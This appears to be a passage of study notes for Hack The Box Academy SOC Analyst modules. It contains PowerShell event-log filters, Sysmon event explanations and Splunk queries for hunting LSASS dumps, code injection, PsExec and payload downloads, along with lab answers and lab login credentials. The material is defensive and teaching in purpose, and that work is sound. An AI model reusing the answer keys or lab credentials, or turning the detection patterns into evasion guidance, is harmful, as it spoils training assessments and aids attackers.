PSObject -Property @{\n    SourceIP = $eventData | Where-Object {$_.Name -eq \"SourceIp\"} | Select-Object -ExpandProperty '#text'\n    DestinationIP = $eventData | Where-Object {$_.Name -eq \"DestinationIp\"} | Select-Object -ExpandProperty '#text'\n    ProcessGuid = $eventData | Where-Object {$_.Name -eq \"ProcessGuid\"} | Select-Object -ExpandProperty '#text'\n    ProcessId = $eventData | Where-Object {$_.Name -eq \"ProcessId\"} | Select-Object -ExpandProperty '#text'\n}\n}  | Where-Object {$_.DestinationIP -eq \"52.113.194.132\"}\n\nPS C:\\Users\\Administrator&gt; $Query = @\"\n    &lt;QueryList&gt;\n        &lt;Query Id=\"0\"&gt;\n            &lt;Select Path=\"Microsoft-Windows-Sysmon/Operational\"&gt;*[System[(EventID=7)]] and *[EventData[Data='mscoree.dll']] or *[EventData[Data='clr.dll']]\n            &lt;/Select&gt;\n        &lt;/Query&gt;\n    &lt;/QueryList&gt;\n    \"@\nPS C:\\Users\\Administrator&gt; Get-WinEvent -FilterXml $Query | ForEach-Object {Write-Host $_.Message `n}\n\n# Filtering events with FilterXPath\nPS C:\\Users\\Administrator&gt; Get-WinEvent -LogName 'Microsoft-Windows-Sysmon/Operational' -FilterXPath \"*[EventData[Data[@Name='Image']='C:\\Windows\\System32\\reg.exe']] and *[EventData[Data[@Name='CommandLine']='`\"C:\\Windows\\system32\\reg.exe`\" ADD HKCU\\Software\\Sysinternals /v EulaAccepted /t REG_DWORD /d 1 /f']]\" | Select-Object TimeCreated, ID, ProviderName, LevelDisplayName, Message | Format-Table -AutoSize\n\nPS C:\\Users\\Administrator&gt; Get-WinEvent -LogName 'Microsoft-Windows-Sysmon/Operational' -FilterXPath \"*[System[EventID=3] and EventData[Data[@Name='DestinationIp']='52.113.194.132']]\"\n\n# Filtering events based on property values\nPS C:\\Users\\Administrator&gt; Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-Sysmon/Operational'; ID=1} -MaxEvents 1 | Select-Object -Property *\n\nPS C:\\Users\\Administrator&gt; Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-Sysmon/Operational'; ID=1} | Where-Object {$_.Properties[21].Value -like \"*-enc*\"} | Format-List\n</code></pre> <pre><code>Get-WinEvent -FilterHashtable @{Path='C:\\Tools\\chainsaw\\EVTX-ATTACK-SAMPLES\\Lateral Movement\\*.evtx'} | Where-Object{$_.Message -like \"*\\\\*\\PRINT*\"}  | Format-Table -AutoSize\n\n\\\\*\\PRINT\n\nGet-WinEvent Microsoft-Windows-WLAN-AutoConfig/Operational | Where-Object{$_.Message -like \"*$SearchString*\"}    \n</code></pre> <p> 12:30:30</p>"}, {"location": "HTB/Academy/SOC%20Analyst/#skill-assessment", "title": "Skill assessment", "text": "<p>Q1: By examining the logs located in the \"C:\\Logs\\DLLHijack\" directory, determine the process responsible for executing a DLL hijacking attack. Enter the process name as your answer. Answer format: _.exe</p> <ol> <li> <p>modify the sysmonconfig file with this changes (Imageload Onmatch = exclusive ) Update it in cmd with (sysmon.exe -c \u2026.)</p> </li> <li> <p>open Event viewer and open saved logs. Filter event id equals 7 and search for 'wininet.dll'. </p> </li> </ol> <p>Q2: By examining the logs located in the \"C:\\Logs\\PowershellExec\" directory, determine the process that executed unmanaged PowerShell code. Enter the process name as your answer. Answer format: _.exe</p> <ol> <li> <p>correctly configure the sysmon. and open saved logs in Event viewer</p> </li> <li> <p>Filter event id 7 and search 'wininet.dll' or 'clr.dll' or 'clrjit.dll' and see if anything process is weird. Or search '.Net'</p> </li> </ol> <p>Q3: By examining the logs located in the \"C:\\Logs\\PowershellExec\" directory, determine the process that injected into the process that executed unmanaged PowerShell code. Enter the process name as your answer. Answer format: _.exe</p> <p>In Q2 we know the process id is 3776, we need to find its parent process. Who create this thread.</p> <pre><code>In the Sysmon event ID 8 (CreateRemoteThread), a log is generated when a process creates a thread in another process by using the CreateRemoteThread function. This technique is used by malware to inject code and hide in other processes. The event indicates the source and target process.\n</code></pre> <p>So, filter event id 8 and find the TargetProcessId: 3776.</p> <p>Q4: By examining the logs located in the \"C:\\Logs\\Dump\" directory, determine the process that performed an LSASS dump. Enter the process name as your answer. Answer format: _.exe</p> <pre><code># event id is 10\n&lt;ProcessAccess onmatch=\"exclude\"&gt;\n            &lt;!--NOTE: Using \"include\" with no rules means nothing in this section will be logged--&gt;\n&lt;/ProcessAccess&gt;\n</code></pre> <p>Filter event id 10 and search 'lsass.exe', trying every exe file that looks malicious.</p> <p>processhacker.exe</p> <p>Q5: By examining the logs located in the \"C:\\Logs\\Dump\" directory, determine if an ill-intended login took place after the LSASS dump. Answer format: Yes or No</p> <p>No</p> <p>Q6: By examining the logs located in the \"C:\\Logs\\StrangePPID\" directory, determine a process that was used to temporarily execute code based on a strange parent-child relationship. Enter the process name as your answer. Answer format: _.exe</p> <p>SourceImage: C:\\Windows\\System32\\svchost.exe TargetProcessGUID: {67e39d39-f935-6269-8203-000000000300} TargetProcessId: 7780 TargetImage: C:\\Windows\\System32\\werfault.exe</p>"}, {"location": "HTB/Academy/SOC%20Analyst/#hunting-for-stuxbot", "title": "Hunting For Stuxbot", "text": "<p>Q3:</p> <p><code>powershell.file.script_block_text : P*V*</code></p> <p></p>"}, {"location": "HTB/Academy/SOC%20Analyst/#hunting-for-stuxbot-round-2", "title": "Hunting For Stuxbot (Round 2)", "text": "<p>Q1:</p> <p><code>\"C:\\Users\\Public*\" and event.code: 11</code></p> <p>Sysmon id 11: FileCreate, Event ID 11 contains details about the file's path, the operation that created or modified the file, and the file's hash.</p> <p>Q2:</p> <p><code>event.code:13 AND registry.path: *Run*</code></p> <p>Sysmon Event ID 13 - RegistryEvent (Value Set)</p> <p>This Registry event type identifies Registry value modifications. The event records the value written for Registry values of type DWORD and QWORD .</p> <p>Q3:</p> <p><code>powershell.file.script_block_text: *Enter-PSSession* and event.code:4104</code></p> <p>Event 4104 will capture PowerShell commands and show script block logging. A great indicator that PowerShell was executed is Event ID 400. PowerShell's Event ID 400 will detail when the EngineState has started. You may also be wondering how we can correlate an Event ID 400 with an Event ID 4103.</p>"}, {"location": "HTB/Academy/SOC%20Analyst/#understanding-log-sources-investigating-with-splunk", "title": "Understanding Log Sources &amp; Investigating with Splunk", "text": "<p><code>search index=\"main\" \"UNKNOWN\"</code></p> <p>UNKNOWN is used as a keyword to filter and retrieve events that include this specific term.</p> <p><code>index=\"main\" \"*UNKNOWN*\"</code></p> <p><code>index=\"main\" EventCode!=1</code></p> <p><code>index=\"main\" sourcetype=\"WinEventLog:Sysmon\" EventCode=1 | fields - User</code></p> <p>the fields command excludes the User field from the search results. </p> <p><code>index=\"main\" sourcetype=\"WinEventLog:Sysmon\" EventCode=1 | table _time, host, Image</code></p> <p><code>index=\"main\" sourcetype=\"WinEventLog:Sysmon\" EventCode=1 | rename Image as Process</code></p> <p><code>index=\"main\" sourcetype=\"WinEventLog:Sysmon\" EventCode=1 | dedup Image</code></p> <p>The 'dedup' command removes duplicate events. </p> <p><code>index=\"main\" sourcetype=\"WinEventLog:Sysmon\" EventCode=1 | sort - _time</code></p> <p>the most recent events are shown first.</p> <p><code>index=\"main\" sourcetype=\"WinEventLog:Sysmon\" EventCode=3 | stats count by _time, Image</code></p> <p>The stats command performs statistical operations. </p> <p><code>index=\"main\" sourcetype=\"WinEventLog:Sysmon\" EventCode=3 | chart count by _time, Image</code></p> <p>The chart command creates a data visualization based on statistical operations.</p> <p><code>index=\"main\" sourcetype=\"WinEventLog:Sysmon\" EventCode=1 | eval Process_Path=lower(Image)</code></p> <p>The eval command creates or redefines fields. This command creates a new field Process_Path which contains the lowercase version of the Image field. It doesn't change the actual Image field, but creates a new field that can be used in subsequent operations or for display purposes.</p> <p><code>index=\"main\" EventCode=4662 | rex max_match=0 \"[^%](?&lt;guid&gt;{.*})\" | table guid</code></p> <p>The rex command extracts new fields from existing ones using regular expressions.</p> <p><code>rex max_match=0 \"[^%](?&lt;guid&gt;{.*})\"</code> uses the rex command to extract values matching the pattern from the events' fields. The regex pattern {.*} looks for substrings that begin with { and end with }. The [^%] part ensures that the match does not begin with a % character. The captured value within the curly braces is assigned to the named capture group guid.</p> <p><code>index=\"main\" sourcetype=\"WinEventLog:Sysmon\" EventCode=1 | rex field=Image \"(?P&lt;filename&gt;[^\\\\\\]+)$\" | eval filename=lower(filename) | lookup malware_lookup.csv filename OUTPUTNEW is_malware | table filename, is_malware</code></p> <p>The lookup command enriches the data with external sources.</p> <p><code>index=\"main\" sourcetype=\"WinEventLog:Sysmon\" EventCode=1 | eval filename=mvdedup(split(Image, \"\\\\\")) | eval filename=mvindex(filename, -1) | eval filename=lower(filename) | lookup malware_lookup.csv filename OUTPUTNEW is_malware | table filename, is_malware | dedup filename, is_malware</code></p> <p><code>| inputlookup malware_lookup.csv</code></p> <p>The inputlookup command retrieves data from a lookup file without joining it to the search results.</p> <p><code>index=\"main\" earliest=-7d EventCode!=1</code></p> <p>Every event in Splunk has a timestamp. Using the time range picker or the earliest and latest commands, you can limit searches to specific time periods.</p> <p><code>index=\"main\" sourcetype=\"WinEventLog:Sysmon\" (EventCode=1 OR EventCode=3) | transaction Image startswith=eval(EventCode=1) endswith=eval(EventCode=3) maxspan=1m | table Image |  dedup Image</code></p> <p>The transaction command is used in Splunk to group events that share common characteristics into transactions, often used to track sessions or user activities that span across multiple events.</p> <p><code>index=\"main\" sourcetype=\"WinEventLog:Sysmon\" EventCode=1 NOT [ search index=\"main\" sourcetype=\"WinEventLog:Sysmon\" EventCode=1 | top limit=100 Image | fields Image ] | table _time, Image, CommandLine, User, ComputerName</code></p> <p>A subsearch in Splunk is a search that is nested inside another search. It's used to compute a set of results that are then used in the outer search.</p>"}, {"location": "HTB/Academy/SOC%20Analyst/#spl", "title": "SPL", "text": "<p><code>| eventcount summarize=false index=* | table index</code></p> <p>This query uses eventcount to count events in all indexes, then summarize=false is used to display counts for each index separately, and finally, the table command is used to present the data in tabular form.</p> <p><code>| metadata type=sourcetypes</code></p> <p>This search uses the metadata command, which provides us with various statistics about specified indexed fields. Here, we're focusing on sourcetypes. The result is a list of all sourcetypes in our Splunk environment, along with additional metadata such as the first time a source type was seen (firstTime), the last time it was seen (lastTime), and the number of hosts (totalCount).</p> <p>For a simpler view, we can use the following search.</p> <p><code>| metadata type=sourcetypes index=* | table sourcetype</code></p> <p><code>| metadata type=sources index=* | table source</code></p> <p>This command returns a list of all data sources in the Splunk environment.</p> <p><code>sourcetype=\"WinEventLog:Security\" | table _raw</code></p> <p><code>sourcetype=\"WinEventLog:Security\" | table *</code></p> <p>The use of table * can result in a very wide table if our events have a large number of fields.</p> <p><code>sourcetype=\"WinEventLog:Security\" | fields Account_Name, EventCode | table Account_Name, EventCode</code></p> <p><code>sourcetype=\"WinEventLog:Security\" | fieldsummary</code></p> <p>The values provided by the fieldsummary command are calculated based on the events returned by our search.</p> <p><code>index=* sourcetype=* | bucket _time span=1d | stats count by _time, index, sourcetype | sort - _time</code></p> <p>bucket command is used to group the events based on the _time field into 1-day buckets.</p> <p><code>index=* sourcetype=* | rare limit=10 index, sourcetype</code></p> <p>The rare command can help us identify uncommon event types, which might be indicative of abnormal behavior. </p> <p><code>index=\"main\" | rare limit=20 useother=f ParentImage</code></p> <p>This command displays the 20 least common values of the ParentImage field.</p> <p><code>index=* sourcetype=* | fieldsummary | where count &lt; 100 | table field, count, distinct_count</code></p> <p>This search shows a summary of all fields (fieldsummary), filters out fields that appear in less than 100 events (where count &lt; 100), and then displays a table (table) showing the field name, total count, and distinct count.</p> <p><code>index=* | sistats count by index, sourcetype, source, host</code></p>"}, {"location": "HTB/Academy/SOC%20Analyst/#introduction-to-splunk-spl", "title": "Introduction To Splunk &amp; SPL", "text": "<p>Q1:</p> <p><code>sourcetype=\"WinEventLog:Security\" EventCode=4768 | sistats count by Account_Name</code></p> <p>The event code for a Kerberos authentication ticket request is 4768</p> <p></p> <p>Q2:</p> <p><code>sourcetype=\"WinEventLog:Security\" EventCode=4624 Account_Name=SYSTEM | sistats count by ComputerName</code></p> <p></p> <p>Q3:</p> <p><code>sourcetype=\"WinEventLog:Security\" EventCode=4624 | stats earliest(_time) as first_login latest(_time) as last_login count as total_attempts by Account_Name | eval duration = last_login - first_login | where duration &lt;= 600 | sort - total_attempts | head 1 | fields Account_Name, total_attempts, duration</code></p> <p></p>"}, {"location": "HTB/Academy/SOC%20Analyst/#using-splunk-applications", "title": "Using Splunk Applications", "text": "<p>Q2:</p> <p><code>index=* sourcetype=\"wineventlog:sysmon\" EventCode=3 Image=\"*SharpHound.exe\" | stats count</code></p>"}, {"location": "HTB/Academy/SOC%20Analyst/#intrusion-detection-with-splunk-real-world-scenario", "title": "Intrusion Detection With Splunk (Real-world Scenario)", "text": "<pre><code>index=\"main\" earliest=0\n\nindex=\"main\" | stats count by sourcetype\n\nindex=\"main\" sourcetype=\"WinEventLog:Sysmon\"\n\nindex=\"main\" uniwaldo.local\n\nindex=\"main\" *uniwaldo.local*\n\nindex=\"main\" ComputerName=\"*uniwaldo.local\"\n\nindex=\"main\" sourcetype=\"WinEventLog:Sysmon\" | stats count by EventCode\n</code></pre> <p>Sysmon Event ID 1 - Process Creation: Useful for hunts targeting abnormal parent-child process hierarchies, as illustrated in the first lesson with Process Hacker. It's an event we can use later.</p> <p>Sysmon Event ID 2 - A process changed a file creation time: Helpful in spotting \"time stomp\" attacks, where attackers alter file creation times. Bear in mind, not all such actions signal malicious intent.</p> <p>Sysmon Event ID 3 - Network connection: A source of abundant noise since machines are perpetually establishing network connections. We may uncover anomalies, but let's consider other quieter areas first.</p> <p>Sysmon Event ID 4 - Sysmon service state changed: Could be a useful hunt if attackers attempt to stop Sysmon, though the majority of these events are likely benign and informational, considering Sysmon's frequent legitimate starts and stops.</p> <p>Sysmon Event ID 5 - Process terminated: This might aid us in detecting when attackers kill key processes or use sacrificial ones. For instance, Cobalt Strike often spawns temporary processes like werfault, the termination of which would be logged here, as well as the creation in ID 1.</p> <p>Sysmon Event ID 6 - Driver loaded: A potential flag for BYOD (bring your own driver) attacks, though this is less common. Before diving deep into this, let's weed out more conspicuous threats first.</p> <p>Sysmon Event ID 7 - Image loaded: Allows us to track dll loads, which is handy in detecting DLL hijacks.</p> <p>Sysmon Event ID 8 - CreateRemoteThread: Potentially aids in identifying injected threads. While remote threads can be created legitimately, if an attacker misuses this API, we can potentially trace their rogue process and what they injected into.</p> <p>Sysmon Event ID 10 - ProcessAccess: Useful for spotting remote code injection and memory dumping, as it records when handles on processes are made.</p> <p>Sysmon Event ID 11 - FileCreate: With many files being created frequently due to updates, downloads, etc., it might be challenging to aim our hunt directly here. However, these events can be beneficial in correlating or identifying a file's origins later.</p> <p>Sysmon Event ID 12 - RegistryEvent (Object create and delete) &amp; Sysmon Event ID 13 - RegistryEvent (Value Set): While numerous events take place here, many registry events can be malicious, and with a good idea of what to look for, hunting here can be fruitful.</p> <p>Sysmon Event ID 15 - FileCreateStreamHash: Relates to file streams and the \"Mark of the Web\" pertaining to external downloads, but we'll leave this aside for now.</p> <p>Sysmon Event ID 16 - Sysmon config state changed: Logs alterations in Sysmon configuration, useful for spotting tampering.</p> <p>Sysmon Event ID 17 - Pipe created &amp; Sysmon Event ID 18 - Pipe connected: Record pipe creations and connections. They can help observe malware's interprocess communication attempts, usage of PsExec, and SMB lateral movement.</p> <p>Sysmon Event ID 22 - DNSEvent: Tracks DNS queries, which can be beneficial for monitoring beacon resolutions and DNS beacons.</p> <p>Sysmon Event ID 23 - FileDelete: Monitors file deletions, which can provide insights into whether a threat actor cleaned up their malware, deleted crucial files, or possibly attempted a ransomware attack.</p> <p>Sysmon Event ID 25 - ProcessTampering (Process image change): Alerts on behaviors such as process herpadering, acting as a mini AV alert filter.</p> <pre><code>index=\"main\" sourcetype=\"WinEventLog:Sysmon\" EventCode=1 | stats count by ParentImage, Image\n\nindex=\"main\" sourcetype=\"WinEventLog:Sysmon\" EventCode=1 (Image=\"*cmd.exe\" OR Image=\"*powershell.exe\") | stats count by ParentImage, Image\n\nindex=\"main\" sourcetype=\"WinEventLog:Sysmon\" EventCode=1 (Image=\"*cmd.exe\" OR Image=\"*powershell.exe\") ParentImage=\"C:\\\\Windows\\\\System32\\\\notepad.exe\"\n\nindex=\"main\" 10.0.0.229 | stats count by sourcetype\n\nindex=\"main\" 10.0.0.229 sourcetype=\"linux:syslog\"\n\nindex=\"main\" 10.0.0.229 sourcetype=\"WinEventLog:sysmon\" | stats count by CommandLine\n\nindex=\"main\" 10.0.0.229 sourcetype=\"WinEventLog:sysmon\" | stats count by CommandLine, host\n\nindex=\"main\" EventCode=4662 Access_Mask=0x100 Account_Name!=*$\n\nindex=\"main\" EventCode=10 lsass | stats count by SourceImage\n\nindex=\"main\" EventCode=10 lsass SourceImage=\"C:\\\\Windows\\\\System32\\\\notepad.exe\"\n\nindex=\"main\" CallTrace=\"*UNKNOWN*\" | stats count by EventCode\n\nindex=\"main\" CallTrace=\"*UNKNOWN*\" | stats count by SourceImage\n\nindex=\"main\" CallTrace=\"*UNKNOWN*\" | where SourceImage!=TargetImage | stats count by SourceImage\n\nindex=\"main\" CallTrace=\"*UNKNOWN*\" SourceImage!=\"*Microsoft.NET*\" CallTrace!=*ni.dll* CallTrace!=*clr.dll* | where SourceImage!=TargetImage | stats count by SourceImage\n\nindex=\"main\" CallTrace=\"*UNKNOWN*\" SourceImage!=\"*Microsoft.NET*\" CallTrace!=*ni.dll* CallTrace!=*clr.dll* CallTrace!=*wow64* | where SourceImage!=TargetImage | stats count by SourceImage\n\nindex=\"main\" CallTrace=\"*UNKNOWN*\" SourceImage!=\"*Microsoft.NET*\" CallTrace!=*ni.dll* CallTrace!=*clr.dll* CallTrace!=*wow64* SourceImage!=\"C:\\\\Windows\\\\Explorer.EXE\" | where SourceImage!=TargetImage | stats count by SourceImage\n\nindex=\"main\" CallTrace=\"*UNKNOWN*\" SourceImage!=\"*Microsoft.NET*\" CallTrace!=*ni.dll* CallTrace!=*clr.dll* CallTrace!=*wow64* SourceImage!=\"C:\\\\Windows\\\\Explorer.EXE\" | where SourceImage!=TargetImage | stats count by SourceImage, TargetImage, CallTrace\n</code></pre> <p>Q1:</p> <p><code>index=\"main\" EventCode=10 lsass | stats count by SourceImage</code></p> <p>rundll32.exe</p> <p>Q2:</p> <p><code>index=\"main\" EventCode=10 lsass SourceImage=\"C:\\\\Windows\\\\System32\\\\rundll32.exe\" | stats count by CallTrace</code></p> <p></p> <p>comsvcs.dll</p> <p>Q3:</p> <p><code>index=\"main\" CallTrace=\"*UNKNOWN*\" SourceImage!=\"*Microsoft.NET*\" CallTrace!=*clr.dll* CallTrace!=*ni.dll* | where SourceImage!=TargetImage | stats count by SourceImage</code></p> <p>rundll32.exe</p> <p>Q4:</p> <p><code>index=\"main\" sourcetype=\"WinEventLog:Sysmon\" EventCode=3 Image=\"C:\\\\Windows\\\\System32\\\\rundll32.exe\" DestinationIp=\"*\" | rex field=DestinationIp \"10\\\\.0\\\\.0\\\\.(?&lt;octet&gt;\\\\d{1,3})\" | search (octet&gt;=0 AND octet&lt;=99) OR (octet&gt;=100 AND octet&lt;=199) | stats values(DestinationIp) as destination_ips</code></p> <p></p> <p>10.0.0.186 and 10.0.0.91</p> <p>Q5:</p> <p><code>index=main EventCode=3 (SourceIp=\"10.0.0.186\" OR SourceIp=\"10.0.0.91\") DestinationPort=\"*\" | stats values(DestinationPort) as destination_ports</code></p> <p><code>index=main EventCode=3 (SourceIp=\"10.0.0.186\" OR SourceIp=\"10.0.0.91\") | stats count by DestinationPort</code></p>"}, {"location": "HTB/Academy/SOC%20Analyst/#detecting-attacker-behavior-with-splunk-based-on-ttps", "title": "Detecting Attacker Behavior With Splunk Based On TTPs", "text": "<ol> <li>Example: Detection Of Reconnaissance Activities Leveraging Native Windows Binaries</li> </ol> <p><code>index=\"main\" sourcetype=\"WinEventLog:Sysmon\" EventCode=1 Image=*\\\\ipconfig.exe OR Image=*\\\\net.exe OR Image=*\\\\whoami.exe OR Image=*\\\\netstat.exe OR Image=*\\\\nbtstat.exe OR Image=*\\\\hostname.exe OR Image=*\\\\tasklist.exe | stats count by Image,CommandLine | sort - count</code></p> <ol> <li>Example: Detection Of Requesting Malicious Payloads/Tools Hosted On Reputable/Whitelisted Domains (Such As githubusercontent.com)</li> </ol> <p><code>index=\"main\" sourcetype=\"WinEventLog:Sysmon\" EventCode=22  QueryName=\"*github*\" | stats count by Image, QueryName</code></p> <ol> <li>Example: Detection Of PsExec Usage</li> </ol> <p><code>index=\"main\" sourcetype=\"WinEventLog:Sysmon\" EventCode=13 Image=\"C:\\\\Windows\\\\system32\\\\services.exe\" TargetObject=\"HKLM\\\\System\\\\CurrentControlSet\\\\Services\\\\*\\\\ImagePath\" | rex field=Details \"(?&lt;reg_file_name&gt;[^\\\\\\]+)$\" | eval reg_file_name = lower(reg_file_name), file_name = if(isnull(file_name),reg_file_name,lower(file_name)) | stats values(Image) AS Image, values(Details) AS RegistryDetails, values(_time) AS EventTimes, count by file_name, ComputerName</code></p> <p><code>| rex field=Details \"(?&lt;reg_file_name&gt;[^\\\\\\]+)$\"</code>: The rex command here is extracting the file name from the Details field using a regular expression. The pattern [^\\]+)$ captures the part of the path after the last backslash, which is typically the file name. This value is stored in a new field reg_file_name.</p> <p><code>index=\"main\" sourcetype=\"WinEventLog:Sysmon\" EventCode=11 Image=System | stats count by TargetFilename</code></p> <p><code>index=\"main\" sourcetype=\"WinEventLog:Sysmon\" EventCode=18 Image=System | stats count by PipeName</code></p> <ol> <li>Example: Detection Of Utilizing Archive Files For Transferring Tools Or Data Exfiltration</li> </ol> <p><code>index=\"main\" EventCode=11 (TargetFilename=\"*.zip\" OR TargetFilename=\"*.rar\" OR TargetFilename=\"*.7z\") | stats count by ComputerName, User, TargetFilename | sort - count</code></p> <ol> <li>Example: Detection Of Utilizing PowerShell or MS Edge For Downloading Payloads/Tools</li> </ol> <p><code>index=\"main\" sourcetype=\"WinEventLog:Sysmon\" EventCode=11 Image=\"*powershell.exe*\" |  stats count by Image, TargetFilename |  sort + count</code></p> <p><code>index=\"main\" sourcetype=\"WinEventLog:Sysmon\" EventCode=11 Image=\"*msedge.exe\" TargetFilename=*\"Zone.Identifier\" |  stats count by TargetFilename |  sort + count</code></p> <p>The <code>*Zone.Identifier</code> is indicative of a file downloaded from the internet or another potentially untrustworthy source. Windows uses this zone identifier to track the security zones of a file. The Zone.Identifier is an ADS (Alternate Data Stream) that contains metadata about where the file was downloaded from and its security settings.</p> <ol> <li>Example: Detection Of Execution From Atypical Or Suspicious Locations</li> </ol> <p><code>index=\"main\" EventCode=1 | regex Image=\"C:\\\\\\\\Users\\\\\\\\.*\\\\\\\\Downloads\\\\\\\\.*\" |  stats count by Image</code></p> <ol> <li>Example: Detection Of Executables or DLLs Being Created Outside The Windows Directory</li> </ol> <p><code>index=\"main\" EventCode=11 (TargetFilename=\"*.exe\" OR TargetFilename=\"*.dll\") TargetFilename!=\"*\\\\windows\\\\*\" | stats count by User, TargetFilename | sort + count</code></p> <ol> <li>Example: Detection Of Misspelling Legitimate Binaries</li> </ol> <p><code>index=\"main\" sourcetype=\"WinEventLog:Sysmon\" EventCode=1 (CommandLine=\"*psexe*.exe\" NOT (CommandLine=\"*PSEXESVC.exe\" OR CommandLine=\"*PsExec64.exe\")) OR (ParentCommandLine=\"*psexe*.exe\" NOT (ParentCommandLine=\"*PSEXESVC.exe\" OR ParentCommandLine=\"*PsExec64.exe\")) OR (ParentImage=\"*psexe*.exe\" NOT (ParentImage=\"*PSEXESVC.exe\" OR ParentImage=\"*PsExec64.exe\")) OR (Image=\"*psexe*.exe\" NOT (Image=\"*PSEXESVC.exe\" OR Image=\"*PsExec64.exe\")) |  table Image, CommandLine, ParentImage, ParentCommandLine</code></p> <ol> <li>Example: Detection Of Using Non-standard Ports For Communications/Transfers</li> </ol> <p><code>index=\"main\" EventCode=3 NOT (DestinationPort=80 OR DestinationPort=443 OR DestinationPort=22 OR DestinationPort=21) | stats count by SourceIp, DestinationIp, DestinationPort | sort - count</code></p>"}, {"location": "HTB/Academy/SOC%20Analyst/#detecting-attacker-behavior-with-splunk-based-on-analytics", "title": "Detecting Attacker Behavior With Splunk Based On Analytics", "text": "<p>The <code>streamstats</code> command allows us to perform real-time analytics on the data, which can be useful for identifying unusual patterns or trends.</p> <p><code>index=\"main\" sourcetype=\"WinEventLog:Sysmon\" EventCode=3 | bin _time span=1h | stats count as NetworkConnections by _time, Image | streamstats time_window=24h avg(NetworkConnections) as avg stdev(NetworkConnections) as stdev by Image | eval isOutlier=if(NetworkConnections &gt; (avg + (0.5*stdev)), 1, 0) | search isOutlier=1</code></p> <ol> <li>Example: Detection Of Abnormally Long Commands</li> </ol> <p><code>index=\"main\" sourcetype=\"WinEventLog:Sysmon\" Image=*cmd.exe | eval len=len(CommandLine) | table User, len, CommandLine | sort - len</code></p> <p><code>index=\"main\" sourcetype=\"WinEventLog:Sysmon\" Image=*cmd.exe ParentImage!=\"*msiexec.exe\" ParentImage!=\"*explorer.exe\" | eval len=len(CommandLine) | table User, len, CommandLine | sort - len</code></p> <ol> <li>Example: Detection Of Abnormal cmd.exe Activity</li> </ol> <p><code>index=\"main\" EventCode=1 (CommandLine=\"*cmd.exe*\") | bucket _time span=1h | stats count as cmdCount by _time User CommandLine | eventstats avg(cmdCount) as avg stdev(cmdCount) as stdev | eval isOutlier=if(cmdCount &gt; avg+1.5*stdev, 1, 0) | search isOutlier=1</code></p> <ol> <li>Example: Detection Of Processes Loading A High Number Of DLLs In A Specific Time</li> </ol> <p><code>index=\"main\" EventCode=7 | bucket _time span=1h | stats dc(ImageLoaded) as unique_dlls_loaded by _time, Image | where unique_dlls_loaded &gt; 3 | stats count by Image, unique_dlls_loaded</code></p> <p><code>index=\"main\" EventCode=7 NOT (Image=\"C:\\\\Windows\\\\System32*\") NOT (Image=\"C:\\\\Program Files (x86)*\") NOT (Image=\"C:\\\\Program Files*\") NOT (Image=\"C:\\\\ProgramData*\") NOT (Image=\"C:\\\\Users\\\\waldo\\\\AppData*\")| bucket _time span=1h | stats dc(ImageLoaded) as unique_dlls_loaded by _time, Image | where unique_dlls_loaded &gt; 3 | stats count by Image, unique_dlls_loaded | sort - unique_dlls_loaded</code></p> <ol> <li>Example: Detection Of Transactions Where The Same Process Has Been Created More Than Once On The Same Computer</li> </ol> <p><code>index=\"main\" sourcetype=\"WinEventLog:Sysmon\" EventCode=1 | transaction ComputerName, Image | where mvcount(ProcessGuid) &gt; 1 | stats count by Image, ParentImage</code></p> <p><code>index=\"main\" sourcetype=\"WinEventLog:Sysmon\" EventCode=1  | transaction ComputerName, Image  | where mvcount(ProcessGuid) &gt; 1 | search Image=\"C:\\\\Windows\\\\System32\\\\rundll32.exe\" ParentImage=\"C:\\\\Windows\\\\System32\\\\svchost.exe\" | table CommandLine, ParentCommandLine</code></p> <p>Q1:</p> <p><code>index=\"main\" sourcetype=\"WinEventLog:Sysmon\" EventCode=8  | bin _time span=1h  | stats count as thread_injections by _time, SourceImage  | eventstats avg(thread_injections) as avg_injections, stdev(thread_injections) as stdev_injections  | eval upper_limit = avg_injections + (2 * stdev_injections)  | where thread_injections &gt; upper_limit  | table _time, SourceImage, thread_injections, avg_injections, stdev_injections, upper_limit  | sort -thread_injections</code></p> <p>Sysmon Event ID 8 - CreateRemoteThread: Potentially aids in identifying injected threads.</p> <p><code>index=\"main\" sourcetype=\"WinEventLog:Sysmon\" EventCode=8 | bin _time span=1h  |  stats count as thread_injections by _time, SourceImage</code></p> <p></p>"}, {"location": "HTB/Academy/SOC%20Analyst/#skills-assessment", "title": "Skills Assessment", "text": "<p>Q1: Navigate to http://[Target IP]:8000, open the \"Search &amp; Reporting\" application, and find through SPL searches against all data the process that created remote threads in rundll32.exe. Answer format: _.exe</p> <p><code>index=\"main\" sourcetype=\"WinEventLog:Sysmon\" EventCode=8 TargetImage=\"*rundll32.exe*\" | stats count by SourceImage</code></p> <p>randomfile.exe</p> <p>Q2: Navigate to http://[Target IP]:8000, open the \"Search &amp; Reporting\" application, and find through SPL searches against all data the process that started the infection. Answer format: _.exe</p> <p><code>index=\"main\" sourcetype=\"WinEventLog:Sysmon\" EventCode=11 | search \"*randomfile.exe*\" | stats count by TargetFilename Image</code></p> <p>Found <code>C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe</code> download <code>randomfile.exe</code> and file creation time is <code>11/06/2022 10:08:46 AM</code></p> <p>rundll32.exe</p>"}, {"location": "HTB/Academy/SOC%20Analyst/#windows-attacks-defense", "title": "Windows Attacks &amp; Defense", "text": "<p>Lab Environment</p> <p>The attacks will be executed from the provided Windows 10 (WS001) and Kali Linux machines. The assumption is that an attacker has already gained remote code execution (of some sort) on that Windows 10 (WS001) machine. The user, which we assume is compromised, is Bob, a regular user in Active Directory with no special permissions assigned.</p> <p>The environment consists of the following machines and their corresponding IP addresses:</p> <p>DC1: 172.16.18.3</p> <p>DC2: 172.16.18.4</p> <p>Server01: 172.16.18.10</p> <p>PKI: 172.16.18.15</p> <p>WS001: DHCP or 172.16.18.25 (depending on the section)</p> <p>Kali Linux: DHCP or 172.16.18.20 (depending on the section)</p> <p>Connect to WS001 via RDP</p> <p><code>xfreerdp /u:eagle\\\\bob /p:Slavi123 /v:TARGET_IP /dynamic-resolution</code></p> <p>Connect to Kali via SSH</p> <p><code>$ ssh kali@TARGET_IP</code> </p> <p>Password is kali</p> <p>We have also enabled RDP on the Kali host. For sections with the Kali host as the primary target, it is recommended to connect with RDP. </p> <p><code>xfreerdp /v:TARGET_IP /u:kali /p:kali /dynamic-resolution</code></p> <p>Moving files between WS001 and your Linux attacking machine</p> <p>To facilitate easy file transfer between the machines, we have created a 